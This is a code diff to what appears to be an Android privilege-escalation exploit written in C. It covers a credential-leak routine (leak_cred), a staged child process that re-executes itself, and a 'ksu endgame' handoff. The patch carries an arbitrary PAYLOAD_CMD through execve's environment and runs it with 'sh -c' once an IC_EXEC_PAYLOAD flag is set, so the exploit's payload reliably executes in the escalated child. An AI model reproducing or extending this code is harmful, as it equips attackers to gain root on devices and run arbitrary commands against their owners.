@@ -2101,9 +2101,19 @@ static unsigned long long leak_cred(unsigned char *raw,
                                        (g_fake_stage ? "fake" : "verify")));
                 char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                     (char *)cmode, NULL};
-                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
+                char pcenv[512];
+                const char *pcg = getenv("PAYLOAD_CMD");
+                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin",
+                                    pcenv, NULL};
+                char *const epk[] = {(char *)"PATH=/system/bin:/system/xbin",
+                                     (char *)"IC_EXEC_PAYLOAD=1", pcenv, NULL};
 
-                execve("/proc/self/exe", av, ep);
+                /* The child re-execs this binary with a custom environment,
+                 * so PAYLOAD_CMD (safe mode + proof) has to be forwarded
+                 * explicitly; IC_EXEC_PAYLOAD marks the ksu endgame. */
+                snprintf(pcenv, sizeof(pcenv), "PAYLOAD_CMD=%s",
+                         pcg && *pcg ? pcg : "");
+                execve("/proc/self/exe", av, g_exec_payload ? epk : ep);
                 logf("[-] leak child exec failed errno=%d\n", errno);
             }
             _exit(127);
@@ -2271,7 +2281,7 @@ static int wait_child_main(const char *mode)
 
             const char *pc = getenv("PAYLOAD_CMD");
 
-            if (g_exec_payload && pc && *pc)
+            if (getenv("IC_EXEC_PAYLOAD") && pc && *pc)
             {
                 char *const pv[] = {(char *)"sh", (char *)"-c", (char *)pc,
                                     NULL};
@@ -2942,6 +2952,7 @@ int main(int argc, char **argv)
          * (its ksu_handoff.sh + proof) instead of an interactive shell. */
         g_fake_stage = 1;
         g_exec_payload = 1;
+        (void)setenv("IC_EXEC_PAYLOAD", "1", 1);
     }
     if (argc > 1 && !strcmp(argv[1], "sites")) {
         setvbuf(stdout, NULL, _IONBF, 0);
